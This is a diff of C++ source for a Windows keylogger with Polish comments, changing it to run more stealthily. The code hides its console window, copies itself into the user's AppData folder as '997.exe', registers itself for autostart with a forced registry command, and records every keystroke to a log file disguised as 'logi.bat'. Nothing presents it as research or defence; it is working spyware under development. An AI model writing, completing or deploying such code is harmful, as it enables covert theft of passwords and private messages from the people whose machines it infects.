@@ -5,7 +5,8 @@
 #include <cstring>
 using namespace std;
 fstream logs;
-const string SCIEZKA="C:\\Users\\Patryk\\AppData\\Roaming\\KeyLogger.exe";
+const string SCIEZKA=getenv("APPDATA")+string("\\997.exe");
+const string SCIEZKA_LOGOW = getenv("APPDATA")+string("\\logi.bat");
 int i;
 int vKey;
 void doSystemu(string sciezkaKeylogger)
@@ -20,10 +21,24 @@ void Konsola()//Ukrywanie siê konsoli
 }
 void Zapisz(int input)//Zapisywanie do pliku
 {
-    logs.open("Logs.txt", ios::app);
+    logs.open(SCIEZKA_LOGOW.c_str(), ios::app);
     if(logs.is_open())
     {
         logs<<(char)input;
+        logs.close();
+    }
+    if(logs.good()==false)
+    {
+        logs<<"Error";
+        exit(0);
+    }
+}
+void ZapiszSPECIAL(string input)//Zapisywanie do pliku znaków specjalnych
+{
+    logs.open(SCIEZKA_LOGOW.c_str(), ios::app);
+    if(logs.is_open())
+    {
+        logs<<input;
         logs.close();
     }
     if(logs.good()==false)
@@ -38,29 +53,17 @@ bool Mutex()
     if(GetLastError() == ERROR_ALREADY_EXISTS)
     {
         return true;
-    }else{
+    }
+    else
+    {
         return false;
     }
 }
 void Autostart(string sciezka)//Dodawanie do autostartu
 {
-    string komenda = "reg ADD HKEY_CURRENT_USER\\Microsoft\\Windows\\CurrentVersion\\Explorer\\StartupApproved\\Run /v Test /t REG_SZ /d C:\\Users\\Patryk\\Desktop\\997\\bin\\Debug\\997.exe"+sciezka;
+    string komenda = "reg ADD HKEY_CURRENT_USER\\Microsoft\\Windows\\CurrentVersion\\Explorer\\StartupApproved\\Run /v Test /f /t REG_SZ /d C:\\Users\\Patryk\\Desktop\\997\\bin\\Debug\\997.exe"+sciezka;
     cout<<komenda;
     system(komenda.c_str());
-}
-void ZapiszSPECIAL(string input)//Zapisywanie do pliku znaków specjalnych
-{
-    logs.open("Logs.txt", ios::app);
-    if(logs.is_open())
-    {
-        logs<<input;
-        logs.close();
-    }
-    if(logs.good()==false)
-    {
-        logs<<"Error";
-        exit(0);
-    }
 }
 void Keylogger()
 {
@@ -73,7 +76,7 @@ void Keylogger()
             if(vKey==-32767 && !GetAsyncKeyState(VK_SHIFT))
             {
                 cout<<(char)(i+32);
-                Zapisz(i);
+                Zapisz(i+32);
             }
             else if(vKey==-32767 && GetAsyncKeyState(VK_SHIFT))
             {
@@ -201,12 +204,12 @@ void Keylogger()
 }
 int main(int argc, char * argv[])
 {
-     if (!Mutex())
-     {
-         Konsola();
-         Autostart("C:\\Users\\Patryk\\Desktop\\997\\bin\\Debug\\997.exe");
-         Keylogger();
-         doSystemu(argv[0]);
-     }
+    if (!Mutex())
+    {
+        Konsola();
+        Autostart(SCIEZKA);
+        Keylogger();
+        doSystemu(argv[0]);
+    }
     return 0;
 }
